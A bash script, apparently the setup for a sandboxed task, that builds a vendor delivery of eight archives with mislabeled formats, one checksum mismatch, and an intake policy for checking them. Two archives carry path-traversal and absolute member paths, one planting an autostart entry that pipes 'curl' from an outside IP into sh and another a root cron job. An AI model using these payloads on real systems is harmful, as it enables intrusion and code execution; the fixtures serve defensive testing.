#!/bin/bash
# $1 = sandbox path
# A vendor delivery of 8 archives (random member counts) and SHA256SUMS:
#   fonts.tar.gz      real tar.gz                          -> accept
#   icons.tar.gz      really a zip                         -> accept
#   docs.zip          really a tar.xz                      -> accept
#   templates.tar     really a tar.bz2                     -> accept
#   samples.tgz       really a plain tar                   -> accept
#   plugins.tar.gz    tar.gz with ../../.config/autostart/  -> unsafe
#   firmware.tar.xz   tar.xz with /etc/cron.d/...          -> unsafe
#   drivers.zip       zip, swapped after SHA256SUMS        -> checksum fails
# The two malicious tars are built with Python's tarfile, so no real path is
# ever touched.
SANDBOX="$1"
cd "$SANDBOX" || exit 1
mkdir -p delivery .gen

hash256() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi | cut -d' ' -f1; }
some() { seq 1 $(( RANDOM % $2 + $1 )); }   # some MIN SPREAD -> 1..N

mkdir -p .gen/fonts
for i in $(some 3 6); do head -c $((RANDOM % 3000 + 500)) /dev/urandom > ".gen/fonts/Inter-w$((i * 100)).woff2"; done
tar -czf delivery/fonts.tar.gz -C .gen fonts

mkdir -p .gen/icons/svg .gen/icons/png
for i in $(some 4 8); do printf '<svg id="icon-%d"/>\n' "$i" > ".gen/icons/svg/icon-$i.svg"; done
for i in $(some 2 4); do head -c 400 /dev/urandom > ".gen/icons/png/icon-$i@2x.png"; done
( cd .gen && zip -qr ../delivery/icons.tar.gz icons )

mkdir -p .gen/docs/api
for i in $(some 2 5); do printf '# Chapter %d\n\nUsing the vendor SDK.\n' "$i" > ".gen/docs/chapter-$i.md"; done
printf '# API reference\n' > .gen/docs/api/index.md
tar -cJf delivery/docs.zip -C .gen docs

mkdir -p .gen/templates/email
for i in $(some 3 5); do printf 'Hello {{name}}, template %d\n' "$i" > ".gen/templates/email/t$i.txt"; done
tar -cjf delivery/templates.tar -C .gen templates

mkdir -p .gen/samples
for i in $(some 2 6); do printf 'id,value\n%d,%d\n' "$i" "$RANDOM" > ".gen/samples/sample-$i.csv"; done
tar -cf delivery/samples.tgz -C .gen samples

python3 - "$((RANDOM % 4 + 2))" "$((RANDOM % 4 + 2))" <<'PY'
import io, sys, tarfile, os
n_plugins, n_fw = int(sys.argv[1]), int(sys.argv[2])

def add(tf, name, data=None):
    ti = tarfile.TarInfo(name)
    ti.mtime = 1793000000
    if data is None:
        ti.type, ti.mode = tarfile.DIRTYPE, 0o755
        tf.addfile(ti)
    else:
        ti.size, ti.mode = len(data), 0o644
        tf.addfile(ti, io.BytesIO(data))

with tarfile.open("delivery/plugins.tar.gz", "w:gz", format=tarfile.GNU_FORMAT) as tf:
    add(tf, "plugins/")
    for i in range(n_plugins):
        add(tf, f"plugins/plugin-{i + 1}.so", os.urandom(700))
    add(tf, "../../.config/autostart/vendor-updater.desktop",
        b"[Desktop Entry]\nType=Application\nExec=sh -c 'curl -s http://198.51.100.7/u | sh'\n")
with tarfile.open("delivery/firmware.tar.xz", "w:xz", format=tarfile.GNU_FORMAT) as tf:
    add(tf, "firmware/")
    for i in range(n_fw):
        add(tf, f"firmware/fw-rev{i + 1}.bin", os.urandom(900))
    add(tf, "/etc/cron.d/vendor-update", b"*/5 * * * * root /opt/vendor/update.sh\n")
PY

mkdir -p .gen/drivers
for i in $(some 2 4); do head -c 1200 /dev/urandom > ".gen/drivers/usb-$i.ko"; done
( cd .gen && zip -qr ../delivery/drivers.zip drivers )
drivers_sum=$(hash256 < delivery/drivers.zip)
# Swapped in transit: same names, different content
head -c 1200 /dev/urandom > .gen/drivers/usb-1.ko
rm delivery/drivers.zip
( cd .gen && zip -qr ../delivery/drivers.zip drivers )

{
  for f in docs.zip firmware.tar.xz fonts.tar.gz icons.tar.gz plugins.tar.gz samples.tgz templates.tar; do
    printf '%s  %s\n' "$(hash256 < "delivery/$f")" "$f"
  done
  printf '%s  %s\n' "$drivers_sum" drivers.zip
} | LC_ALL=C sort -k2 > delivery/SHA256SUMS
rm -rf .gen

cat > INTAKE-POLICY.txt <<'EOF'
Vendor intake policy
1. Never trust a file name: record what each archive really is.
2. An archive is accepted only if its sha256 matches the vendor's SHA256SUMS
   AND none of its member paths is absolute or contains a ".." component.
3. Accepted archives are extracted into accepted/<name>/, where <name> is
   the file name up to the first dot (fonts.tar.gz -> accepted/fonts/).
   Everything else stays packed in delivery/ for the security team.
EOF
